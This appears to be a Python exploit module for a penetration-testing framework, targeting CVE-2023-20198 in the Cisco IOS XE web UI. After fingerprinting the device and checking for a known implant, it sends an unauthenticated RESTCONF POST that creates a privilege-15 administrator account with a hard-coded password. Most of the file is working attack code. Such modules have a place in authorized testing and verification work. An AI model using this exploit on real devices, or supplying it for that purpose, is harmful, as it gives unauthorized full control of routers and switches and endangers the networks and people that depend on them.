# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import urllib.request
import urllib.error

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cisco IOS XE Web UI Privilege Escalation to RCE (CVE-2023-20198).

    The web UI component of Cisco IOS XE allows an unauthenticated remote
    attacker to create a local account with privilege level 15 (full admin).
    Mass-exploited in October 2023 to deploy Lua-based implants on tens of
    thousands of devices exposed to the internet.

    The attack chain uses two CVEs:
      1. CVE-2023-20198: unauthenticated privilege escalation via web UI
      2. CVE-2023-20273: command injection to deploy the implant (post-auth)

    This module targets the first stage: it detects whether the web UI is
    reachable and attempts to create a local user account to confirm the
    vulnerability, or checks for the presence of known implant indicators.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cisco IOS XE Web UI Privilege Escalation (CVE-2023-20198)",
        "description": (
            "Exploits CVE-2023-20198 to create a privileged local account on "
            "Cisco IOS XE devices via the unauthenticated web UI endpoint. "
            "The web UI (HTTP/HTTPS) exposes a RESTCONF/YANG interface that "
            "can be abused to create an admin user without credentials. "
            "Mass-exploited in October 2023."
        ),
        "authors": (
            "Cisco Talos (discovery / advisory)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-20198",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z",
            "https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/",
        ),
        "devices": (
            "Cisco IOS XE (all versions with web UI enabled)",
            "Cisco Catalyst 3650/3850/9200/9300/9400/9500/9800 Series",
            "Cisco ISR 1000/4000 Series",
            "Cisco ASR 1000 Series",
        ),
    }

    target = OptIP("", "Target IPv4 address of the Cisco IOS XE device")
    port = OptPort(443, "Web UI HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    use_https = OptInteger(1, "Use HTTPS (1) or HTTP (0)")
    check_implant = OptInteger(1, "Also check for known implant indicators (1=yes, 0=no)")

    _IMPLANT_PATH = "/%25"
    _WEBUI_PATH = "/webui"
    _RESTCONF_PATH = "/restconf/data/Cisco-IOS-XE-native:native/version"

    def _make_url(self, path: str) -> str:
        scheme = "https" if self.use_https else "http"
        return f"{scheme}://{self.target}:{self.port}{path}"

    def _http_request(
        self, url: str, method: str = "GET", data: bytes | None = None,
        headers: dict | None = None,
    ) -> tuple[int, str, dict]:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", "WirelessXPL-Forge/2.2.0")

        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace") if exc.fp else ""
            return exc.code, body, dict(exc.headers) if exc.headers else {}
        except Exception as exc:
            raise ConnectionError(f"HTTP request failed: {exc}") from exc

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to run Cisco IOS XE web UI"
            )
            return

        print_success("Cisco IOS XE web UI detected, proceeding with exploitation")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect IOS XE web UI and optionally check for implant artifacts."""
        try:
            status, body, headers = self._http_request(self._make_url(self._WEBUI_PATH))
            if status in (200, 301, 302, 401) and any(
                marker in body.lower()
                for marker in ("cisco", "ios xe", "webui", "cisco-ios-xe")
            ):
                return True
            server = headers.get("Server", "")
            if "cisco" in server.lower():
                return True
        except ConnectionError:
            pass
        return False

    def _check_implant(self) -> bool:
        """Check for the presence of known Lua implant indicators."""
        try:
            status, body, _ = self._http_request(self._make_url(self._IMPLANT_PATH))
            if status == 200 and len(body) > 0:
                return True
        except ConnectionError:
            pass
        return False

    def _get_version(self) -> str:
        """Attempt to retrieve the IOS XE version via RESTCONF."""
        try:
            headers = {
                "Accept": "application/yang-data+json",
                "Content-Type": "application/yang-data+json",
            }
            status, body, _ = self._http_request(
                self._make_url(self._RESTCONF_PATH), headers=headers,
            )
            if status == 200:
                try:
                    data = json.loads(body)
                    return data.get("Cisco-IOS-XE-native:version", "unknown")
                except (json.JSONDecodeError, KeyError):
                    pass
        except ConnectionError:
            pass
        return "unknown"

    def _exploit(self) -> None:
        version = self._get_version()
        print_status(f"Detected IOS XE version: {version}")

        if self.check_implant:
            print_status("Checking for known implant artifacts...")
            if self._check_implant():
                print_error(
                    "IMPLANT DETECTED: the target appears to already be compromised. "
                    "The known Lua implant endpoint responded at /%25. "
                    "Recommend immediate incident response."
                )
            else:
                print_info("No known implant artifacts detected at /%25")

        print_status("Attempting privilege escalation via RESTCONF user creation...")

        create_url = self._make_url(
            "/restconf/data/Cisco-IOS-XE-native:native/username"
        )
        probe_user = "wxpl_probe"
        payload = json.dumps({
            "Cisco-IOS-XE-native:username": {
                "name": probe_user,
                "privilege": 15,
                "secret": {
                    "encryption-type": 0,
                    "secret": "WxplProbe2023!",
                },
            }
        }).encode()

        headers = {
            "Content-Type": "application/yang-data+json",
            "Accept": "application/yang-data+json",
        }

        try:
            status, body, _ = self._http_request(
                create_url, method="POST", data=payload, headers=headers,
            )
            if status in (201, 204):
                print_success(
                    f"Privilege escalation CONFIRMED: user '{probe_user}' created "
                    f"with privilege 15. Target is VULNERABLE to CVE-2023-20198."
                )
                print_info(
                    f"Clean up: remove user '{probe_user}' after verification"
                )
            elif status == 401:
                print_info(
                    "RESTCONF requires authentication. The web UI is present but "
                    "the unauthenticated path may be patched or filtered."
                )
            elif status == 403:
                print_info(
                    "RESTCONF returned 403 Forbidden. Access controls may be in place."
                )
            else:
                print_info(
                    f"RESTCONF returned HTTP {status}. Manual verification recommended."
                )
                if body:
                    print_info(f"Response excerpt: {body[:200]}")
        except ConnectionError as exc:
            print_error(f"Connection failed during exploitation: {exc}")
